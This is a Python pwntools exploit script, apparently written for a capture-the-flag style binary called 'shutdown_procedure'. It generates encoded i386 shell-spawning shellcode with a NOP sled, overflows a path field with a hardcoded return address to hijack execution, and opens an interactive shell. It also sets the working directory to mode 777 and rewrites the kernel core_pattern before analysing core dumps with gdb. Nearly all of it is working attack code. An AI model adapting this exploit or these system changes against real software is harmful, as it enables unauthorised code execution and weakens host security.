import os
import sys
from pwn import *
import time
import subprocess
import glob

def try_exploit(padding_length):
    # Start the process using Pwntools
    binary_path = "./shutdown_procedure"
    context.log_level = 'debug'  # Enable debug logging
    context.arch = 'i386'  # Set architecture
    context.os = 'linux'   # Set OS
    
    # Set up core dump pattern to write to current directory
    try:
        # First, make sure we can write to the current directory
        os.system('chmod 777 .')
        # Set a simpler core pattern
        os.system('echo "core.%p" > /proc/sys/kernel/core_pattern')
        os.system('ulimit -c unlimited')
        print("[*] Core dump pattern set to core.%p")
    except Exception as e:
        print(f"[!] Error setting core pattern: {e}")
    
    # Start the process with core dump enabled
    proc = process(binary_path)
    
    def print_output():
        while proc.can_recv(timeout=0.1):
            try:
                output = proc.recv(timeout=0.1).decode().strip()
                print(f"Output: {output}")
            except:
                pass
    
    def add_sequence(name, path, type_num, reason):
        try:
            proc.sendline(b'1')  # Choose add sequence
            time.sleep(0.5)
            print_output()
            proc.sendline(str(type_num).encode())  # Type (1 for Normal)
            time.sleep(0.5)
            print_output()
            print("sending name")
            proc.sendline(name)  # Name (already encoded)
            time.sleep(0.5)
            print_output()
            print("sending path")
            proc.sendline(path)  # Path (already encoded)
            time.sleep(0.5)
            print_output()
            print("sending reason")
            proc.sendline(reason.encode())  # Reason
            time.sleep(0.5)
            print_output()
            return True
        except Exception as e:
            print(f"Error in add_sequence: {e}")
            return False

    try:
        # Use Pwntools' shellcode generator with encoding
        shellcode = shellcraft.i386.linux.sh()
        shellcode = encode(asm(shellcode), avoid=b'\x0a\x0d\x04\x09\x0b')
        
        # Print the shellcode to check for problematic characters
        print(f"\n[*] Trying padding length: {padding_length}")
        print("[*] Shellcode bytes:", end=' ')
        for b in shellcode:
            print(f"\\x{b:02x}", end='')
        print()
        
        # Create the exploit sequence
        print("[*] Sending exploit sequence...")
        
        # Create overflow payload for path field with current padding length
        # Add NOP sled before the shellcode
        nop_sled = b'\x90' * 16  # 16 bytes of NOPs
        overflow = b'A' * padding_length + p32(0x0804c0d6)  # Return address from core dump
        
        success = add_sequence(
            name=nop_sled + shellcode,  # NOP sled + shellcode in name field
            path=overflow,  # Overflow in path field
            type_num=1,  # Normal type
            reason=""  # Empty reason to avoid interference
        )
        
        if not success:
            print("[!] Failed to add sequence")
            proc.close()
            return False
        
        print("[*] Exploit sent, waiting for shell...")
        proc.interactive()
        return True

    except KeyboardInterrupt:
        print("\nTerminating interaction.")
        return False
        
    except Exception as e:
        print(f"Error: {e}")
        return False

    finally:
        # Close the process
        proc.close()
        print("Binary interaction closed.")
        
        # Get process ID and user ID
        pid = proc.pid
        uid = os.getuid()
        print(f"\n[*] Process ID: {pid}")
        print(f"[*] User ID: {uid}")
        
        # Look for core file in current directory
        print("\n[*] Looking for core file...")
        core_pattern = f"core.{pid}"
        if os.path.exists(core_pattern):
            print(f"[*] Found core file: {core_pattern}")
            try:
                # Use GDB to analyze the core file
                gdb_cmd = f'gdb {binary_path} {core_pattern} -ex "bt" -ex "info registers" -ex "x/i $pc" -ex "quit"'
                print("\n[*] Analyzing core file with GDB:")
                os.system(gdb_cmd)
            except Exception as e:
                print(f"Error analyzing core file: {e}")
        else:
            print("[!] No core file found")
            # Try to list all files in current directory to see what's there
            print("\n[*] Listing files in current directory:")
            os.system('ls -la')
            
        # Print the last few lines of output
        print("\n[*] Last output from process:")
        print_output()

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 exploit.py <padding_length>")
        print("Example: python3 exploit.py 82")
        sys.exit(1)
    
    try:
        padding_length = int(sys.argv[1])
        try_exploit(padding_length)
    except ValueError:
        print("Error: padding_length must be a number")
        sys.exit(1)

if __name__ == "__main__":
    main()
